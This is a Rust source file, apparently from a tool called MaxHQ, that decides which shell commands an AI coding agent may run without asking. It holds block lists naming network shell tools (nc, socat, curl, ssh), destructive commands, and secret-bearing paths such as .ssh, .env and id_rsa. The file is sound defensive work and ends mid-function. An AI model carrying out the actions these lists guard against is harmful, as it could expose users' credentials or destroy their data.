// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Max Boksem

//! Which shell commands an agent may run without asking you, as Claude's
//! auto mode decides for its own.
//!
//! A command line is read the way a shell splits it, quotes and all, into
//! the commands its `&&`, `||`, `;`, `|` and newlines chain. Every one of
//! them has to pass, or you're asked. A line that could do something its
//! words don't show is always asked about: one with backticks or `$` outside
//! single quotes, except a `$` right before a closing double quote, an unquoted
//! `{`, `}` or `[`, process substitution, a heredoc or any `<`, `sudo` or `su`,
//! a leading `NAME=value`, a subshell, a background `&`, or output redirected
//! anywhere but `/dev/null` or another descriptor. So is an unquoted `*` or `?`
//! on a command with flags this refuses, since a file named as one of them
//! would become that flag.
//!
//! In Auto a command passes when it only reads, such as `ls`, `git show`
//! or `cargo test`, and its paths stay inside the agent's folders. A reading
//! command passes only with the flags its table here lists, read the way the
//! program reads them, as runs like `-rnA3`, `--name=value` and a value in
//! the next word. Any other flag could write a file, run a program or read a
//! file its words don't show, so it asks. In Ask, Accept edits and Auto a
//! command passes when one of the project's rules names it. "Always allow"
//! saves a rule for the command and its subcommand, such as `git show` from
//! `git show 1a2b3c`. A command that deletes, moves, overwrites, reaches the
//! network, runs other code or publishes keeps its exact words, so only that
//! same command passes again. So does one with a flag before its subcommand,
//! such as `pip -q install`, and one that reaches outside the folders: a rule
//! that isn't exact covers a command only inside them.
//!
//! In every mode, a `cd` passes only inside the folders, and a path through a
//! name that holds secrets, such as `.ssh` or `.claude`, or into MaxHQ's own
//! data folder passes only under an exact rule. On this machine a path is
//! placed after following its symlinks the way the kernel does, so a link in
//! the folders that points out of them reads as outside, and a path that
//! can't be followed reads as outside too. For a workspace elsewhere only the
//! path's words count, so a path it can't place from them asks.
//!
//! On Windows an agent's commands run in PowerShell or `cmd.exe`, which read a
//! line differently from sh. A `\` there separates folders and is read as a
//! `/`. A line with what either of them would expand or escape always asks:
//! a backtick, `^`, `%`, `@`, `[` or `]`, a `*`, `?`, `{` or `}` in quotes, a
//! doubled quote, a `\` before a quote, or any redirection to a file. `git.exe` counts as `git`, and the commands that
//! delete, run code or change the system there keep their exact words, as do
//! cmdlets such as `remove-item` and scripts such as `build.cmd`.

use std::ffi::OsString;
use std::path::{Component, Path, PathBuf};

use maxhq_protocol::model::{CommandRule, EditKind};

/// Commands that only read, whatever their arguments.
const READERS: &[&str] = &[
    "ls", "pwd", "cat", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg", "fd", "tree", "file",
    "stat", "du", "df", "which", "type", "echo", "printf", "sort", "uniq", "cut", "tr", "diff",
    "cmp", "basename", "dirname", "realpath", "readlink", "date", "whoami", "uname", "jq",
];

/// Readers with no flag that writes a file or runs anything, so a file named
/// as a flag can only change what they read or print when `*` or `?` expands.
const GLOB_SAFE: &[&str] = &[
    "ls", "pwd", "cat", "head", "wc", "grep", "egrep", "fgrep", "stat", "du", "df", "which",
    "type", "echo", "cut", "tr", "diff", "cmp", "basename", "dirname", "realpath", "readlink",
    "whoami", "uname",
];

/// Git subcommands that only read.
const GIT_READERS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "blame",
    "rev-parse",
    "ls-files",
    "ls-tree",
    "grep",
    "describe",
    "shortlog",
    "cat-file",
    "merge-base",
    "for-each-ref",
];

/// Commands whose second word picks what they do, so a rule keeps both.
const WITH_SUBCOMMANDS: &[&str] = &[
    "git", "cargo", "go", "npm", "pnpm", "yarn", "bun", "gh", "pip", "pip3", "uv", "rustup",
    "deno", "brew", "make", "just", "swift", "dotnet", "poetry", "mix", "gradle", "mvn",
];

/// The package managers whose `run <script>` keeps the script's name too.
const SCRIPT_RUNNERS: &[&str] = &["npm", "pnpm", "yarn", "bun"];

/// Commands a rule keeps whole: they delete, move or overwrite, reach the
/// network or another machine, or run code their words don't show. The shell's
/// own words are here too, since `then` or `do` comes before another command,
/// and the rest change what later commands do.
const RISKY: &[&str] = &[
    "nc",
    "ncat",
    "socat",
    "telnet",
    "ftp",
    "tar",
    "zip",
    "unzip",
    "patch",
    "install",
    "vim",
    "nvim",
    "ed",
    "ex",
    "emacs",
    "crontab",
    "launchctl",
    "security",
    "gcc",
    "g++",
    "cc",
    "c++",
    "clang",
    "clang++",
    "!",
    "if",
    "then",
    "elif",
    "else",
    "fi",
    "for",
    "while",
    "until",
    "do",
    "done",
    "case",
    "esac",
    "select",
    "function",
    "coproc",
    "trap",
    "alias",
    "unalias",
    "unset",
    "export",
    "declare",
    "typeset",
    "readonly",
    "local",
    "set",
    "setopt",
    "shopt",
    "enable",
    "hash",
    "pushd",
    "popd",
    "rm",
    "rmdir",
    "mv",
    "cp",
    "ln",
    "chmod",
    "chown",
    "chgrp",
    "dd",
    "tee",
    "truncate",
    "shred",
    "kill",
    "pkill",
    "killall",
    "curl",
    "wget",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "docker",
    "kubectl",
    "awk",
    "gawk",
    "xargs",
    "env",
    "eval",
    "exec",
    "source",
    ".",
    "sh",
    "bash",
    "zsh",
    "dash",
    "fish",
    "ksh",
    "python",
    "python3",
    "node",
    "ruby",
    "perl",
    "php",
    "osascript",
    "open",
    "npx",
    "pnpx",
    "bunx",
    "nohup",
    "timeout",
    "nice",
    "time",
    "watch",
    "command",
    "builtin",
    // These run a script or a query they're given, change files or settings,
    // or read what other apps hold.
    "sqlite3",
    "man",
    "csh",
    "tcsh",
    "lua",
    "tclsh",
    "expect",
    "defaults",
    "plutil",
    "ditto",
    "touch",
    "xattr",
    "mkdir",
    "pbpaste",
    "screencapture",
];

/// Subcommands of a tool with subcommands that a rule keeps whole: they
/// install, remove, publish or run other code.
const RISKY_SUBCOMMANDS: &[&str] = &[
    "install",
    "i",
    "add",
    "remove",
    "rm",
    "uninstall",
    "publish",
    "exec",
    "dlx",
    "x",
    "link",
    "unlink",
    "update",
    "upgrade",
    "up",
    "yank",
    "owner",
    "login",
    "logout",
    "global",
    "api",
];

/// Git subcommands a rule keeps whole: they rewrite or throw away work,
/// or push it.
const GIT_RISKY: &[&str] = &[
    "push",
    "reset",
    "clean",
    "checkout",
    "restore",
    "rebase",
    "switch",
    "filter-branch",
    "filter-repo",
    "update-ref",
    "reflog",
    "gc",
    "prune",
    "worktree",
    // These can run a command they're given, or one the repository names.
    "fetch",
    "pull",
    "clone",
    "ls-remote",
    "submodule",
    "bisect",
    "send-email",
    "hook",
    "difftool",
    "mergetool",
    "archive",
    "am",
    "apply",
    "merge",
    "cherry-pick",
    "update-index",
    "credential",
];

/// Git flags that write a file, open a pager they name, or run a program the
/// repository's config names.
const GIT_DENIED: &[&str] = &[
    "--output",
    "--open-files-in-pager",
    "-O",
    "--ext-diff",
    "--textconv",
    "--filters",
    "--show-signature",
];

/// sed's long flags that neither write a file nor read a script from one.
const SED_LONG: &[&str] = &[
    "--quiet",
    "--silent",
    "--regexp-extended",
    "--null-data",
    "--separate",
    "--unbuffered",
    "--sandbox",
    "--debug",
    "--posix",
];

/// Why a line is always asked about.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Refusal {
    /// It runs a command inside another: `$(`, backticks, `<(` or `>(`.
    Substitution,
    /// The shell would change its words first: a `$` it could expand, or an
    /// unquoted `{`, `}` or `[`.
    Expansion,
    /// It reads a heredoc or a file through `<`.
    Input,
    /// It writes its output to a file.
    Output,
    /// It runs as another user.
    OtherUser,
    /// It sets a variable for the command.
    Assignment,
    /// It runs a subshell or a background job.
    Grouping,
    /// Its quotes don't close.
    Unclosed,
    /// It has no command in it.
    Empty,
}

/// One command of a line, as its words.
type Part = Vec<String>;

/// How the shell that runs a line reads it.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Syntax {
    /// sh's rules, on macOS and Linux.
    Sh,
    /// PowerShell's and `cmd.exe`'s, on Windows, as far as they agree with
    /// sh. Where they don't, the line asks.
    Windows,
}

impl Syntax {
    /// How this machine's shells read a line.
    pub const HOST: Self = if cfg!(windows) {
        Self::Windows
    } else {
        Self::Sh
    };
}

/// One command of a line as the lexer read it.
struct Command {
    words: Part,
    /// The words with an unquoted `*` or `?`, which the shell expands.
    globs: Vec<usize>,
}

/// The folders an agent works in, which a command's paths are read against.
pub struct Folders {
    /// Where a line starts.
    start: PathBuf,
    /// Where a path may land, as the driver knows them and, on this machine,
    /// as they resolve.
    inside: Vec<PathBuf>,
    /// MaxHQ's own data folders, which hold its keys and sign-ins.
    data: Vec<PathBuf>,
    /// Whether the folders are on this machine, so a path's links can be
    /// followed.
    local: bool,
    /// How the shell reads a line.
    syntax: Syntax,
}

/// Where the commands of one line may run, as the `cd`s before them leave it.
struct Here {
    /// Every folder a command may run in: where the line starts and each place
    /// a `cd` may have landed, since one that fails leaves it where it was.
    dirs: Vec<PathBuf>,
    /// Whether a `cd` went somewhere this can't place, so a relative path
    /// could land anywhere.
    lost: bool,
}

/// The most places a line's `cd`s are followed to before it counts as lost.
const MOST_PLACES: usize = 64;

/// The most links one path may pass through. macOS gives up after 32 and
/// Linux after 40, so this never follows more than the kernel would.
const MOST_LINKS: usize = 32;

impl Folders {
    /// The folders `cwd` and `attachments`. `local` says they're on this
    /// machine, so that a path resolves here, links and all. Elsewhere only
    /// its words count.
    pub fn new(cwd: &Path, attachments: &Path, local: bool) -> Self {
        Self::with_data(cwd, attachments, local, data_folders())
    }

    /// The folders, with `data` as MaxHQ's data folders.
    fn with_data(cwd: &Path, attachments: &Path, local: bool, data: Vec<PathBuf>) -> Self {
        let resolved = |paths: &[PathBuf]| -> Vec<PathBuf> {
            paths
                .iter()
                .filter(|_| local)
                .filter_map(|path| resolve(path))
                .collect()
        };
        let mut inside = vec![cwd.to_owned(), attachments.to_owned()];
        inside.extend(resolved(&inside));
        // A relative folder would hold nothing the check can place.
        inside.retain(|folder| folder.is_absolute());
        let mut all_data = data.clone();
        all_data.extend(resolved(&data));
        Self {
            start: cwd.to_owned(),
            inside,
            data: all_data,
            local,
            syntax: if local { Syntax::HOST } else { Syntax::Sh },
        }
    }

    /// Where a line starts out.
    fn here(&self) -> Here {
        Here {
            dirs: vec![self.start.clone()],
            lost: false,
        }
    }

    /// How far a command reaches from `here`.
    fn reach(&self, command: &Command, here: &Here) -> Reach {
        let part = &command.words;
        if command.globs.iter().any(|at| !glob_is_clear(&part[*at])) {
            return Reach::Secret;
        }
        // `HEAD:.env` and `:0:.env` name a file in the repository's history
        // or index.
        let objects = part[0] == "git"
            && part.iter().any(|word| {
                word.split(':')
                    .skip(1)
                    .any(|path| names_secret(Path::new(path)))
            });
        if objects {
            return Reach::Secret;
        }
        let args = &part[1..];
        let reaches: Vec<Reach> = match options_for(&part[0]).map(|options| parse(options, args)) {
            Some(Some(parsed)) => parsed
                .paths
                .iter()
                .map(|path| self.path_reach(path, here))
                .collect(),
            // A reader its table can't read is always asked about, so every
            // word counts.
            Some(None) => args
                .iter()
                .map(|word| self.word_reach(word, here))
                .collect(),
            None => path_words(part)
                .into_iter()
                .map(|word| self.word_reach(word, here))
                .collect(),
        };
        reaches.into_iter().max().unwrap_or(Reach::Inside)
    }

    /// How far one word reaches, as a whole, after a flag's name and after
    /// each `=`, such as in `--file=/etc/passwd` or `-I/etc`.
    fn word_reach(&self, word: &str, here: &Here) -> Reach {
        word.split('=')
            .enumerate()
            .map(|(at, piece)| {
                let path = if at == 0 && word.starts_with('-') {
                    piece.trim_start_matches(|c: char| c == '-' || c.is_ascii_alphanumeric())
                } else {
                    piece
                };
                self.path_reach(path, here)
            })
            .max()
            .unwrap_or(Reach::Inside)
    }

    /// How far one path reaches from everywhere the line may be.
    fn path_reach(&self, path: &str, here: &Here) -> Reach {
        // Names on the way to a folder aren't the path's own.
        if names_secret(self.own(Path::new(path))) {
            return Reach::Secret;
        }
        if here.lost && !path.starts_with('/') {
            return Reach::Outside;
        }
        here.dirs
            .iter()
            .map(|dir| self.at_reach(self.place(path, dir).as_deref()))
            .max()
            .unwrap_or(Reach::Outside)
    }

    /// How far a path reaches where it landed, or from nowhere when it
    /// couldn't be placed.
    fn at_reach(&self, at: Option<&Path>) -> Reach {
        let Some(at) = at else {
            return Reach::Outside;
        };
        if self.in_data(at) {
            return Reach::Secret;
        }
        match self.inside_of(at) {
            Some(own) if names_secret(own) => Reach::Secret,
            Some(_) => Reach::Inside,
            None if names_secret(at) => Reach::Secret,
            None => Reach::Outside,
        }
    }

    /// Where `path` lands from `dir`: on this machine after following its
    /// links the way the kernel does, elsewhere as far as its words tell.
    /// None when that can't be told.
    fn place(&self, path: &str, dir: &Path) -> Option<PathBuf> {
        if path.starts_with('~') {
            return None;
        }
        if self.local {
            resolve(&dir.join(path))
        } else {
            landing(path, dir)
        }
    }

    /// `path` past the deepest folder that holds it, or none when none does.
    fn inside_of<'a>(&self, path: &'a Path) -> Option<&'a Path> {
        self.inside
            .iter()
            .filter_map(|folder| path.strip_prefix(folder).ok())
            .min_by_key(|own| own.components().count())
    }

    /// `path`'s own names: past the folder that holds it, or all of them.
    fn own<'a>(&self, path: &'a Path) -> &'a Path {
        self.inside_of(path).unwrap_or(path)
    }

    /// Whether `at` is in one of MaxHQ's data folders, and not in one of the
    /// agent's own folders kept there, such as its attachments.
    fn in_data(&self, at: &Path) -> bool {
        let kept = |data: &PathBuf| {
            self.inside
                .iter()
                .any(|folder| folder != data && folder.starts_with(data) && at.starts_with(folder))
        };
        self.data
            .iter()
            .any(|data| at.starts_with(data) && !kept(data))
    }

    /// Follows a `cd`, adding where it may land to `here`, and says whether
    /// it lands inside the folders from everywhere the line may be. One with
    /// no folder, one back to the last folder, one with flags and one with a
    /// glob can land anywhere.
    fn cd(&self, command: &Command, here: &mut Here) -> bool {
        let target = match command.words.as_slice() {
            [_, target] if !target.starts_with('-') && command.globs.is_empty() => target,
            _ => {
                here.lost = true;
                return false;
            }
        };
        let mut stays = self.path_reach(target, here) == Reach::Inside;
        let mut landed = Vec::new();
        for dir in &here.dirs {
            landed.extend(self.place(target, dir));
            // A shell's own `cd` takes `..` off the words first, and follows
            // the links only when that path isn't there.
            if self.local && !target.starts_with('~') {
                let named = lexical(&dir.join(target));
                stays &= self.at_reach(resolve(&named).as_deref()) == Reach::Inside;
                landed.push(named);
            }
        }
        for at in landed {
            if !here.dirs.contains(&at) {
                here.dirs.push(at);
            }
        }
        here.lost |= !stays || here.dirs.len() > MOST_PLACES;
        stays
    }

    /// Whether the agent may change `path` without asking: it lands inside the
    /// folders, off the files that decide what runs later, off names that hold
    /// secrets and out of MaxHQ's data, both as written and, on this machine,
    /// where its links lead. A folder's own path doesn't count, as a workspace
    /// may live under `.claude/worktrees`.
    pub fn may_change(&self, path: &str) -> bool {
        // A name that decides what runs counts past every folder that holds
        // the path, so a folder kept inside another one's `.git` or `.maxhq`
        // doesn't hide it. A secret name counts past the deepest, as the
        // agent's attachments sit inside MaxHQ's data folder.
        let runs = |path: &Path| {
            self.past_each(path)
                .into_iter()
                .any(|own| any_name(own, decides_what_runs))
        };
        let clear = |path: &Path| !runs(path) && !names_secret(self.own(path));
        let Some(at) = self.place(path, &self.start) else {
            return false;
        };
        clear(Path::new(path)) && !self.in_data(&at) && self.inside_of(&at).is_some() && clear(&at)
    }

    /// The kind of file `path` is when it decides what runs later outside
    /// the agent, such as a git hook or a CI workflow, as written or where
    /// it lands. [`Self::may_change`] lets these through, so the driver
    /// asks about them unless you allowed the kind. Its names count past
    /// every folder that holds it, as there.
    pub fn runs_later(&self, path: &str) -> Option<EditKind> {
        let kind = |path: &Path| self.past_each(path).into_iter().find_map(kind_of_file);
        kind(Path::new(path)).or_else(|| kind(&self.place(path, &self.start)?))
    }

    /// `path` past each folder that holds it, or all of it when none does.
    fn past_each<'a>(&self, path: &'a Path) -> Vec<&'a Path> {
        let owns: Vec<&Path> = self
            .inside
            .iter()
            .filter_map(|folder| path.strip_prefix(folder).ok())
            .collect();
        if owns.is_empty() {
            vec![path]
        } else {
            owns
        }
    }
}

/// How far a command's paths reach, the furthest last.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
enum Reach {
    /// They stay inside the agent's folders.
    Inside,
    /// One lands outside them, or where it lands can't be told.
    Outside,
    /// One goes through a name that holds secrets or into MaxHQ's data, or a
    /// glob could match one.
    Secret,
}

/// Whether `line` may run without asking: in Auto when it only reads and stays
/// inside `folders`, and in any mode but Plan when the rules name every command
/// in it.
pub fn allows(line: &str, auto: bool, rules: &[CommandRule], folders: &Folders) -> bool {
    let syntax = folders.syntax;
    let Ok(commands) = read(line, syntax) else {
        return false;
    };
    let rules: Vec<(Part, bool)> = rules
        .iter()
        .filter_map(|rule| Some((words_of(&rule.command, syntax)?, rule.exact)))
        .collect();
    let mut here = folders.here();
    commands.iter().all(|command| {
        let part = &command.words;
        if is_cd(part) {
            return folders.cd(command, &mut here);
        }
        if glob_matters(command) {
            return false;
        }
        // You approved these words, wherever they reach.
        let exact = rules.iter().any(|(words, exact)| *exact && words == part);
        exact
            || match folders.reach(command, &here) {
                Reach::Inside => {
                    (auto && reads_only(part))
                        || rules.iter().any(|rule| matches(rule, part, syntax))
                }
                // A rule that isn't exact names a command, not where it looks,
                // so it covers one only inside the folders.
                Reach::Outside | Reach::Secret => false,
            }
    })
}

/// The rules "Always allow" saves for `line`: one for each of its
/// commands that doesn't pass on its own. None for a line that's always
/// asked about, and none for a `cd`, which no rule covers.
pub fn rules_for(line: &str, folders: &Folders) -> Vec<CommandRule> {
    let Ok(commands) = read(line, folders.syntax) else {
        return Vec::new();
    };
    let mut rules: Vec<CommandRule> = Vec::new();
    let mut here = folders.here();
    for command in commands.iter().filter(|command| !glob_matters(command)) {
        let part = &command.words;
        if is_cd(part) {
            folders.cd(command, &mut here);
            continue;
        }
        let rule = if risky(part, folders.syntax) || folders.reach(command, &here) != Reach::Inside
        {
            CommandRule {
                command: join(part),
                exact: true,
            }
        } else {
            CommandRule {
                command: join(&key(part)),
                exact: false,
            }
        };
        if !rules.contains(&rule) {
            rules.push(rule);
        }
    }
    rules
}

/// Whether what "Always allow" saves for `line` covers all of it next time. It
/// can't for a line that's always asked about, a `cd` that leaves the folders or
/// a glob that could turn into a flag, so those aren't offered the choice.
pub fn always_allow_holds(line: &str, folders: &Folders) -> bool {
    allows(line, false, &rules_for(line, folders), folders)
}

/// Whether `rule`, as its words and whether it's exact, names `part`.
fn matches((words, exact): &(Part, bool), part: &Part, syntax: Syntax) -> bool {
    if *exact {
        words == part
    } else {
        !risky(part, syntax) && *words == key(part)
    }
}

/// A rule's command back as words, or none for one that doesn't read as
/// a single command.
fn words_of(command: &str, syntax: Syntax) -> Option<Part> {
    let mut parts = read(command, syntax)
        .ok()?
        .into_iter()
        .map(|command| command.words)
        .collect::<Vec<_>>();
    (parts.len() == 1).then(|| parts.remove(0))
}

/// Whether an unquoted `*` or `?` could turn into a flag this refuses.
fn glob_matters(command: &Command) -> bool {
    let words = &command.words;
    let Some(program) = words.first().map(String::as_str) else {
        return false;
    };
    // `wc` and `du` read a list of files from one a flag names, and a name a
    // leading `*` matches could spell that flag. After `--` it can't.
    let dashes = words
        .iter()
        .position(|word| word == "--")
        .unwrap_or(words.len());
    let leading = command
        .globs
        .iter()
        .any(|at| *at < dashes && words[*at].starts_with(['*', '?']));
    !command.globs.is_empty()
        && (!GLOB_SAFE.contains(&program) || (matches!(program, "wc" | "du") && leading))
        && (READERS.contains(&program)
            || WITH_SUBCOMMANDS.contains(&program)
            || matches!(program, "find" | "sed" | "pytest" | "tsc"))
}

/// `cd` changes nothing on its own, but what follows it runs where it landed.
fn is_cd(part: &Part) -> bool {
    part.first().is_some_and(|word| word == "cd")
}

/// Where `path` lands from `from`, or none when its words can't tell: it starts
/// at a home folder, or it climbs after a folder it names, which a symlink
/// could send anywhere.
fn landing(path: &str, from: &Path) -> Option<PathBuf> {
    if path.starts_with('~') {
        return None;
    }
    let mut at = from.to_owned();
    let mut named = false;
    for part in Path::new(path).components() {
        match part {
            Component::Prefix(_) | Component::RootDir => at.push(part),
            Component::CurDir => {}
            Component::ParentDir => {
                if named || !at.pop() {
                    return None;
                }
            }
            Component::Normal(name) => {
                named = true;
                at.push(name);
            }
        }
    }
    Some(at)
}

/// `path` with `.` and `..` taken off its words, as a shell's `cd` does
/// before it looks at the disk.
fn lexical(path: &Path) -> PathBuf {
    let mut at = PathBuf::new();
    for part in path.components() {
        match part {
            Component::ParentDir => {
                at.pop();
            }
            Component::CurDir => {}
            part => at.push(part),
        }
    }
    at
}

/// Where an absolute `path` lands on this machine, following its links the
/// way the kernel does. Past a name that isn't there, the rest counts by its
/// words. None when the kernel would give up on the links, or a folder on the
/// way can't be read.
fn resolve(path: &Path) -> Option<PathBuf> {
    if !path.is_absolute() {
        return None;
    }
    let mut rest = Vec::new();
    push_steps(&mut rest, path);
    let mut at = root_of(path);
    let mut links = 0;
    let mut missing = false;
    while let Some(step) = rest.pop() {
        if step == ".." {
            at.pop();
            continue;
        }
        at.push(&step);
        if missing {
            continue;
        }
        match std::fs::symlink_metadata(&at) {
            Ok(meta) if meta.file_type().is_symlink() => {
                links += 1;
                if links > MOST_LINKS {
                    return None;
                }
                let target = std::fs::read_link(&at).ok()?;
                at.pop();
                if target.is_absolute() {
                    at = root_of(&target);
                }
                push_steps(&mut rest, &target);
            }
            Ok(_) => {}
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => missing = true,
            Err(_) => return None,
        }
    }
    Some(at)
}

/// Where an absolute `path` starts: `/`, or a drive's root such as `C:\`
/// on Windows.
fn root_of(path: &Path) -> PathBuf {
    path.components()
        .take_while(|part| matches!(part, Component::Prefix(_) | Component::RootDir))
        .collect()
}

/// Puts `path`'s names on `rest` so that its first comes off first.
fn push_steps(rest: &mut Vec<OsString>, path: &Path) {
    for part in path.components().rev() {
        match part {
            Component::Normal(name) => rest.push(name.to_owned()),
            Component::ParentDir => rest.push("..".into()),
            Component::CurDir | Component::RootDir | Component::Prefix(_) => {}
        }
    }
}

/// MaxHQ's data folders: this device's, the usual one on Linux and a
/// workspace guest's.
#[cfg(not(test))]
fn data_folders() -> Vec<PathBuf> {
    let mut folders: Vec<PathBuf> = maxhq_core::paths::data_dir().into_iter().collect();
    folders.extend(std::env::home_dir().map(|home| home.join(".local/share/maxhq")));
    folders.push(maxhq_core::paths::GUEST_DATA_DIR.into());
    folders.dedup();
    folders
}

/// MaxHQ's data folders, kept off the real home folder in tests.
#[cfg(test)]
fn data_folders() -> Vec<PathBuf> {
    vec![maxhq_core::paths::GUEST_DATA_DIR.into()]
}

/// Whether `test` holds for any of `path`'s names, lower-cased.
fn any_name(path: &Path, test: fn(&str) -> bool) -> bool {
    path.components().any(|part| match part {
        Component::Normal(name) => test(&name.to_string_lossy().to_ascii_lowercase()),
        _ => false,
    })
}

/// `path`'s names, lower-cased.
fn lower_names(path: &Path) -> Vec<String> {
    path.components()
        .filter_map(|part| match part {
            Component::Normal(name) => Some(name.to_string_lossy().to_ascii_lowercase()),
            _ => None,
        })
        .collect()
}

/// The kind of file `path` is when it decides what runs later, outside the
/// agent: on your next commit, in CI, from your editor or when packages
/// install. One of its names, lower-cased, names the kind, or two in a row
/// do, such as `.github/workflows`. This is the one list of them, and
/// [`edit_words`] names each kind. Agent instruction files, such as
/// `AGENTS.md`, aren't on it.
fn kind_of_file(path: &Path) -> Option<EditKind> {
    let names = lower_names(path);
    names.iter().find_map(|name| named_kind(name)).or_else(|| {
        names
            .windows(2)
            .find_map(|pair| paired_kind(&pair[0], &pair[1]))
    })
}

/// The kind a lower-cased name makes a file or folder.
fn named_kind(name: &str) -> Option<EditKind> {
    Some(match name {
        ".husky" | ".githooks" | ".pre-commit-config.yaml" | ".pre-commit-config.yml" => {
            EditKind::GitHooks
        }
        _ if is_lefthook(name) => EditKind::GitHooks,
        ".gitlab-ci.yml"
        | ".circleci"
        | ".buildkite"
        | "azure-pipelines.yml"
        | "azure-pipelines.yaml"
        | "bitbucket-pipelines.yml"
        | ".travis.yml"
        | ".drone.yml"
        | "jenkinsfile" => EditKind::CiWorkflows,
        ".pnpmfile.cjs" | ".pnpmfile.mjs" | ".yarnrc" | ".yarnrc.yml" => EditKind::PackageHooks,
        ".gitmodules" | ".gitattributes" => EditKind::GitSettings,
        ".devcontainer" | ".devcontainer.json" => EditKind::DevContainer,
        _ => return None,
    })
}

/// The kind a lower-cased name makes a file or folder inside `parent`.
fn paired_kind(parent: &str, name: &str) -> Option<EditKind> {
    Some(match (parent, name) {
        // Local actions run in CI as the workflows that use them.
        (".github", "workflows" | "actions") => EditKind::CiWorkflows,
        (".vscode", "tasks.json" | "launch.json")
        | (".zed", "tasks.json")
        | (".idea", "runconfigurations") => EditKind::EditorTasks,
        // Yarn runs the release `yarnPath` names, and its plugins, on
        // every command.
        (".yarn", "releases" | "plugins") => EditKind::PackageHooks,
        _ => return None,
    })
}

/// What a card about a kind of file says, in English. The apps word the
/// same in your language by the card's kind (`editWords` in
/// packages/shared).
pub struct EditWords {
    /// The kind's short name, such as "Git hooks".
    pub name: &'static str,
    /// The card's title.
    pub title: &'static str,
    /// What files of the kind do, in a line.
    pub meaning: &'static str,
    /// What remembering the kind lets agents do, and where to turn it off.
    pub remembered: &'static str,
}

/// The words for `kind`.
pub const fn edit_words(kind: EditKind) -> EditWords {
    let (name, title, meaning, remembered) = match kind {
        EditKind::GitHooks => (
            "Git hooks",
            "Change git hooks?",
            "Git hooks run on your next commit, with your keys.",
            "Agents in Accept edits or Auto may then change your git hooks in this project \
             without asking. Turn it off in Project settings, under Permissions.",
        ),
        EditKind::CiWorkflows => (
            "CI workflows",
            "Change CI workflows?",
            "CI workflows run on your next push, with the repository's secrets.",
            "Agents in Accept edits or Auto may then change your CI workflows in this project \
             without asking. Turn it off in Project settings, under Permissions.",
        ),
        EditKind::EditorTasks => (
            "Editor tasks",
            "Change editor tasks?",
            "Editor tasks run as you when your editor starts them.",
            "Agents in Accept edits or Auto may then change your editor tasks in this project \
             without asking. Turn it off in Project settings, under Permissions.",
        ),
        EditKind::PackageHooks => (
            "Package manager hooks",
            "Change package manager hooks?",
            "Package manager hooks run as you when packages install.",
            "Agents in Accept edits or Auto may then change your package manager hooks in this \
             project without asking. Turn it off in Project settings, under Permissions.",
        ),
        EditKind::GitSettings => (
            "Git settings",
            "Change git settings?",
            "Git settings pick the submodules git fetches and the filters it runs on your files.",
            "Agents in Accept edits or Auto may then change your git settings in this project \
             without asking. Turn it off in Project settings, under Permissions.",
        ),
        EditKind::DevContainer => (
            "Dev container",
            "Change the dev container?",
            "The dev container sets what runs when it builds and starts, with your files.",
            "Agents in Accept edits or Auto may then change your dev container in this project \
             without asking. Turn it off in Project settings, under Permissions.",
        ),
    };
    EditWords {
        name,
        title,
        meaning,
        remembered,
    }
}

/// Whether a lower-cased name is lefthook's: its config, such as
/// `lefthook.yml` or `.lefthook-local.toml`, or its folder of scripts.
fn is_lefthook(name: &str) -> bool {
    let name = name.strip_prefix('.').unwrap_or(name);
    let stem = match name.rsplit_once('.') {
        Some((stem, "yml" | "yaml" | "toml" | "json" | "jsonc")) => stem,
        _ => name,
    };
    matches!(stem, "lefthook" | "lefthook-local")
}

/// Whether a lower-cased name holds keys or tokens.
fn holds_secrets(name: &str) -> bool {
    matches!(
        name,
        ".ssh"
            | ".aws"
            | ".gnupg"
            | ".netrc"
            | ".kube"
            | ".docker"
            | ".git-credentials"
            | ".pgpass"
            | ".npmrc"
            | ".pypirc"
            | ".tauri"
            | ".appstoreconnect"
            | ".terraform.d"
            | ".vault-token"
            | ".claude.json"
            | ".credentials.json"
            | "auth.json"
            | "credentials.toml"
            | "keychains"
            | "credentials"
            | "credentials.json"
            | "secrets"
    ) || name.starts_with(".env")
        || ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]
            .iter()
            .any(|key| name.starts_with(key))
        || [".pem", ".key", ".p8", ".token"]
            .iter()
            .any(|end| name.ends_with(end))
}

/// Whether a lower-cased name is where a CLI keeps its sign-in. Inside the
/// folders it's the project's own settings, which can hold keys as well.
fn is_cli_home(name: &str) -> bool {
    matches!(name, ".claude" | ".codex" | ".cursor")
}

/// Whether `path` goes through a name that holds keys, tokens or sign-ins:
/// one [`holds_secrets`] or [`is_cli_home`] names, or a folder where a CLI or
/// MaxHQ keeps its own, such as `.config/gh` or MaxHQ's data folder.
fn names_secret(path: &Path) -> bool {
    let names = lower_names(path);
    names
        .iter()
        .any(|name| holds_secrets(name) || is_cli_home(name))
        || names.windows(2).any(|pair| {
            matches!(
                (pair[0].as_str(), pair[1].as_str()),
                (".config", "gh" | "gcloud" | "maxhq" | "cursor")
                    | ("application support", "maxhq")
            )
        })
        || names
            .windows(3)
            .any(|three| three == [".local", "share", "maxhq"])
}

/// Whether a lower-cased name holds what a CLI, git or a shell loads and runs
/// later, with no prompt of its own. All of `.git` counts, since a worktree's
/// `.git` file and a submodule's hooks do this as well.
fn decides_what_runs(name: &str) -> bool {
    is_cli_home(name)
        || matches!(
            name,
            ".mcp.json"
                | ".maxhq"
                | ".git"
                | ".zshrc"
                | ".zshenv"
                | ".zprofile"
                | ".zlogin"
                | ".zlogout"
                | ".bashrc"
                | ".bash_profile"
                | ".bash_login"
                | ".bash_logout"
                | ".profile"
        )
}

/// Whether a word's unquoted `*` and `?` can't match a name that holds secrets:
/// each folder or file name with one must not be hidden, and has to end in a
/// plain extension it spells out, as in `src/*.rs` or `*_test.rs`.
fn glob_is_clear(word: &str) -> bool {
    Path::new(word).components().all(|part| {
        let Component::Normal(name) = part else {
            return true;
        };
        let name = name.to_string_lossy().to_ascii_lowercase();
        let Some(last) = name.rfind(['*', '?']) else {
            return true;
        };
        let tail = &name[last + 1..];
        !name.starts_with('.')
            && ![".pem", ".key", ".p8", ".token"]
                .iter()
                .any(|end| tail.ends_with(end))
